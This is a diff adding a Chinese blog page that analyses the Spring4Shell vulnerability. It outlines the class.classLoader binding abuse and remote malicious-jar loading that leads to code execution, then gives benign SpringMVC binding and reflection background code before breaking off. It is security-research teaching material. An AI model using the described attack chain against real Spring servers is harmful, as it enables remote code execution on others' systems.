@@ -1,0 +1,967 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xzq1_64x64.png">
+  <link rel="icon" href="/img/xzq1_64x64.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="lingx5">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Spring4Shell 漏洞简介Spring4Shell 漏洞实际上是对先前漏洞 CVE-2010-1622 的补丁绕过，CVE-2010-1622，原理就是基于上面的 JavaBean 赋值规则。可以通过提交 class.classLoader 参数，最终执行 getClassLoader 函数获取 ClassLoader 对象，进而利用 URLs[0] 属性远程加载可执行的恶意 jar">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Spring4Shell漏洞分析">
+<meta property="og:url" content="http://lingx5.github.io/2025/05/10/Spring4Shell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="lingx5的博客">
+<meta property="og:description" content="Spring4Shell 漏洞简介Spring4Shell 漏洞实际上是对先前漏洞 CVE-2010-1622 的补丁绕过，CVE-2010-1622，原理就是基于上面的 JavaBean 赋值规则。可以通过提交 class.classLoader 参数，最终执行 getClassLoader 函数获取 ClassLoader 对象，进而利用 URLs[0] 属性远程加载可执行的恶意 jar">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250507183250883.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250507183840814.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250507201211271.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250510151700832.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250507204516562.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250510152758258.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250510123543530.png">
+<meta property="og:image" content="c:/Users/%E5%88%98%E5%BE%B7%E9%BE%99/AppData/Roaming/Typora/typora-user-images/image-20250510105828563.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250510123651699.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250510130517681.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250510130756902.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250510132215684.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250510160407696.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250510160439795.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250510200649208.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250510200803089.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250510203140332.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250510203048697.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250510162639084.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250510203425201.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250510200035518.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250510210406146.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250510211637546.png">
+<meta property="article:published_time" content="2025-05-10T13:34:11.000Z">
+<meta property="article:modified_time" content="2025-05-10T13:35:05.196Z">
+<meta property="article:author" content="lingx5">
+<meta property="article:tag" content="java安全">
+<meta property="article:tag" content="Spring">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250507183250883.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Spring4Shell漏洞分析 - lingx5的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"lingx5.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"#"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"Q4th1PtYC02FHNKGV3QVJgNX-MdYXbMMI","app_key":"Y9vGCfdqm9u55ZBjM8ep8KDX","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-3-23","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>lingx5的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Spring4Shell漏洞分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-05-10 21:34" pubdate>
+          2025年5月10日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          42 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Spring4Shell漏洞分析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <meta name="referrer" content="no-referrer" />
+
+<h1 id="Spring4Shell-漏洞"><a href="#Spring4Shell-漏洞" class="headerlink" title="Spring4Shell 漏洞"></a>Spring4Shell 漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Spring4Shell 漏洞实际上是对先前漏洞 CVE-2010-1622 的补丁绕过，CVE-2010-1622，原理就是基于上面的 JavaBean 赋值规则。可以通过提交 <code>class.classLoader</code> 参数，最终执行 <code>getClassLoader</code> 函数获取 <code>ClassLoader</code> 对象，进而利用 <code>URLs[0]</code> 属性远程加载可执行的恶意 jar 包，导致 RCE。而 Spring4Shell 是由于在 jdk9 以后在 <code>java.lang.Class</code> 类中新增了一个私有变量 <code>module</code>，可以利用 module 获得 ClassLoader 从而实现了一些意想不到的效果。</p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="SpringMVC-参数绑定"><a href="#SpringMVC-参数绑定" class="headerlink" title="SpringMVC 参数绑定"></a>SpringMVC 参数绑定</h3><p>我们先来看对于一个 http 请求，spring 的 contoller 是如何进行参数的封装的，其实就是会根据属性名，调用对应的 getter 和 setter 方法。</p>
+<p>例如一个简单的 get 请求参数 <code>name=lingx5&amp;age=18</code></p>
+<p>他就会先去调用 getName() 方法, 碰到 <code>=</code> 号，再调用 setName() 方法。后面的 age 也是一样的</p>
+<p>我们可以写一个测试的例子，来具体的看一个是如何执行的</p>
+<p><strong>目录结构</strong></p>
+<p>创建一个 springboot 项目，添加如下目录结构</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250507183250883.png" srcset="/img/loading.gif" lazyload alt="image-20250507183250883"></p>
+<p><strong>User 类</strong></p>
+<p>其实就是一个 SpringBean</p>
+<blockquote>
+<p>再 SpringBoot 项目中，entry 目录一般就是存放数据库表所对应用的 Bean 对象的</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.spring4shell.entry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-comment">// 内部类用于模仿一个Bean中有另一个bean的情况</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;调用了Test.getId方法&quot;</span>);<br>            <span class="hljs-keyword">return</span> id;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;调用了Test.setId方法&quot;</span>);<br>            <span class="hljs-built_in">this</span>.id = id;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Test&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;id=&quot;</span> + id +<br>                    <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 定义bean的属性</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> Test test;<br>    <span class="hljs-comment">// 生成getter和setter方法</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了getName方法&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了setName方法&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了getAge方法&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了setAge方法&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Test <span class="hljs-title function_">getTest</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了getTest方法&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTest</span><span class="hljs-params">(Test test)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了setTest方法&quot;</span>);<br>        <span class="hljs-built_in">this</span>.test = test;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>UserController 类</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.spring4shell.controller;<br><br><span class="hljs-keyword">import</span> com.lingx5.spring4shell.entry.User;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserContorller</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/adduser&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">addUser</span><span class="hljs-params">(User user)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>传参为 User 这个对象，我们启动 springboot 项目，发送请求 <code>http://localhost:8080/adduser?name=lingx5&amp;test.id=1</code></p>
+<p>可以发现控制台输出</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250507183840814.png" srcset="/img/loading.gif" lazyload alt="image-20250507183840814" style="zoom: 67%;" />
+
+<p>其内部就是有 springMVC 的组件 <code>WebDataBinder</code> 调用 <code>BeanWrapperImpl.BeanPropertyHandler#getValue</code> 和 <code>BeanWrapperImpl.BeanPropertyHandler#setValue</code> 内部本质是反射来实现的</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250507201211271.png" srcset="/img/loading.gif" lazyload alt="image-20250507201211271"></p>
+<p>可以看一下调用 getter 的调用栈，其他的都是一样的，可以自己调一下</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus">getName:<span class="hljs-number">31</span>, User (com<span class="hljs-selector-class">.lingx5</span><span class="hljs-selector-class">.spring4shell</span>.entry)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (jdk<span class="hljs-selector-class">.internal</span>.reflect)<br>invoke:<span class="hljs-number">77</span>, NativeMethodAccessorImpl (jdk<span class="hljs-selector-class">.internal</span>.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (jdk<span class="hljs-selector-class">.internal</span>.reflect)<br>invoke:<span class="hljs-number">568</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)<br>getValue:<span class="hljs-number">308</span>, BeanWrapperImpl<span class="hljs-variable">$BeanPropertyHandler</span> (org<span class="hljs-selector-class">.springframework</span>.beans)<br>processLocalProperty:<span class="hljs-number">446</span>, AbstractNestablePropertyAccessor (org<span class="hljs-selector-class">.springframework</span>.beans)<br>setPropertyValue:<span class="hljs-number">278</span>, AbstractNestablePropertyAccessor (org<span class="hljs-selector-class">.springframework</span>.beans)<br>setPropertyValue:<span class="hljs-number">266</span>, AbstractNestablePropertyAccessor (org<span class="hljs-selector-class">.springframework</span>.beans)<br>setPropertyValues:<span class="hljs-number">104</span>, AbstractPropertyAccessor (org<span class="hljs-selector-class">.springframework</span>.beans)<br>applyPropertyValues:<span class="hljs-number">856</span>, DataBinder (org<span class="hljs-selector-class">.springframework</span>.validation)<br>doBind:<span class="hljs-number">751</span>, DataBinder (org<span class="hljs-selector-class">.springframework</span>.validation)<br>doBind:<span class="hljs-number">198</span>, WebDataBinder (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span>.bind)<br>bind:<span class="hljs-number">118</span>, ServletRequestDataBinder (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span>.bind)<br></code></pre></td></tr></table></figure>
+
+<p>setter 的调用栈</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus">setName:<span class="hljs-number">36</span>, User (com<span class="hljs-selector-class">.lingx5</span><span class="hljs-selector-class">.spring4shell</span>.entry)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (jdk<span class="hljs-selector-class">.internal</span>.reflect)<br>invoke:<span class="hljs-number">77</span>, NativeMethodAccessorImpl (jdk<span class="hljs-selector-class">.internal</span>.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (jdk<span class="hljs-selector-class">.internal</span>.reflect)<br>invoke:<span class="hljs-number">568</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)<br>setValue:<span class="hljs-number">332</span>, BeanWrapperImpl<span class="hljs-variable">$BeanPropertyHandler</span> (org<span class="hljs-selector-class">.springframework</span>.beans)<br>processLocalProperty:<span class="hljs-number">463</span>, AbstractNestablePropertyAccessor (org<span class="hljs-selector-class">.springframework</span>.beans)<br>setPropertyValue:<span class="hljs-number">278</span>, AbstractNestablePropertyAccessor (org<span class="hljs-selector-class">.springframework</span>.beans)<br>setPropertyValue:<span class="hljs-number">266</span>, AbstractNestablePropertyAccessor (org<span class="hljs-selector-class">.springframework</span>.beans)<br>setPropertyValues:<span class="hljs-number">104</span>, AbstractPropertyAccessor (org<span class="hljs-selector-class">.springframework</span>.beans)<br>applyPropertyValues:<span class="hljs-number">856</span>, DataBinder (org<span class="hljs-selector-class">.springframework</span>.validation)<br>doBind:<span class="hljs-number">751</span>, DataBinder (org<span class="hljs-selector-class">.springframework</span>.validation)<br>doBind:<span class="hljs-number">198</span>, WebDataBinder (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span>.bind)<br>bind:<span class="hljs-number">118</span>, ServletRequestDataBinder (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span>.bind)<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>值得注意的是：</p>
+<p>如果变量为数组类型，即使没有提供对应的 setter 方法，也是可以修改值得，假设有一个 <code>private String[] name;</code> 这样一个变量，我们此时访问 <code>/user?name[0]=lingx5</code> 会把 name [0] 的值修改为 lingx5 ，这其实就是得益于 java 的内省机制，我们后边会讲到。</p>
+<p>在 org.springframework.beans.BeanWrapperImpl#setPropertyValue 方法中 调用了 Array.set() 方法，给数组赋值</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510151700832.png" srcset="/img/loading.gif" lazyload alt="image-20250510151700832"></p>
+</blockquote>
+<h3 id="Class-类"><a href="#Class-类" class="headerlink" title="Class 类"></a>Class 类</h3><p>在 Java 运行时会有两种对象：Class 对象和实例对象。</p>
+<p>Class 对象就是有 JVM 抽象的对象信息：比如有一个类 <code>User</code> 编译后对应一个 <code>User.class</code> 文件，这个 class 只会被 JVM 加载一次，JVM 会把它的描述信息抽象成一个对象（java.lang.Class）。正是这个类提供了 java 的反射机制，来操作源类</p>
+<p>实例对象：User u &#x3D; new User(); 这个 <code>u</code> 就是一个实例对象，可以正常的进行对象方法的调用等操作</p>
+<p>同样的可以简单写一个测试，比较一下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.spring4shell.entry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// User实例对象</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        System.out.println(u);<br>        <span class="hljs-comment">// Class对象</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz1</span> <span class="hljs-operator">=</span> User.class;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz2</span> <span class="hljs-operator">=</span> u.getClass();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz3</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.lingx5.spring4shell.entry.User&quot;</span>);<br>        <span class="hljs-comment">// 输出结果相同，因为Class对象是由JVM在加载类时创建的，所以同一个类只会有一个Class对象</span><br>        System.out.println(clazz1);<br>        System.out.println(clazz2);<br>        System.out.println(clazz3);<br>        <span class="hljs-comment">// 同时，Class对象也是一个类，所以也有自己的Class对象</span><br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Class</span>&gt; clazz4 = clazz1.getClass();<br>        System.out.println(clazz4);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>结果</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250507204516562.png" srcset="/img/loading.gif" lazyload alt="image-20250507204516562"></p>
+<h3 id="javaBean"><a href="#javaBean" class="headerlink" title="javaBean"></a>javaBean</h3><p>其实 javaBean 格式的相关内容，我们再 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/LINGX5/p/18788161#javabean-%E5%AF%B9%E8%B1%A1">fastjson</a> 中已经讲到过了，这里主要就是了解一下在 javaBean 中的内省机制(<code>Introspector</code>) </p>
+<p>Introspector（内省）是 Java 语言中的一种通过反射机制分析类的属性、方法和事件的技术。其实就是允许 javaBean 分析自己的 getter 和 setter 方法查看自己的属性</p>
+<p>jdk 中的内省类主要有</p>
+<ol>
+<li><strong>Introspector 类</strong> : 用 <code>getBeanInfo()</code> 方法获取 JavaBean 的描述信息，封装了分析一个 bean 的全部逻辑</li>
+<li><strong>BeanInfo 接口</strong> : <code>getPropertyDescriptors()</code> 获得所有属性的描述符数组。</li>
+<li><strong>PropertyDescriptor 类</strong> : 封装了一个 Bean 属性的名字、类型、getter、setter 方法等 , 可以调用对应方法，获得 bean 的相关属性和方法</li>
+</ol>
+<p>我们看一个具体的示例</p>
